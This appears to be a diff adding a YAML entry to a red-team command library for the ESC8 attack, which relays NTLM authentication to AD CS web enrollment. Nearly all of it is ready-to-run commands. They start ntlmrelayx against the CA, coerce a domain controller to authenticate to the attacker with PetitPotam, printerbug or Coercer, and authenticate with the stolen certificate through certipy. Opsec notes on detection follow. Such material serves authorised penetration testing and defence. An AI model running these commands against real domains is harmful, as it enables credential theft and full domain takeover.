@@ -1,0 +1,25 @@
+name: ADCSESC8
+description: ESC8 - NTLM relay to AD CS HTTP endpoints (web enrollment)
+commands:
+- '# Step 1: Start NTLM relay targeting ADCS web enrollment'
+- ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
+- ''
+- '# Step 2: Coerce authentication from target (e.g., Domain Controller)'
+- '# Using PetitPotam'
+- python3 PetitPotam.py <ATTACKER_IP> <TARGET_DC>
+- ''
+- '# Using PrinterBug/SpoolSample'
+- python3 printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_DC> <ATTACKER_IP>
+- ''
+- '# Step 3: Use relayed certificate'
+- certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>
+- ''
+- '# Alternative: Coercer tool (multiple coercion methods)'
+- python3 Coercer.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -l <ATTACKER_IP> -t <TARGET_DC>
+opsec:
+- NTLM relay attacks may trigger network detection
+- Web enrollment endpoints log certificate requests
+references:
+- https://posts.specterops.io/certified-pre-owned-d95910965cd2
+- https://github.com/topotam/PetitPotam
+- https://github.com/p0dalirius/Coercer
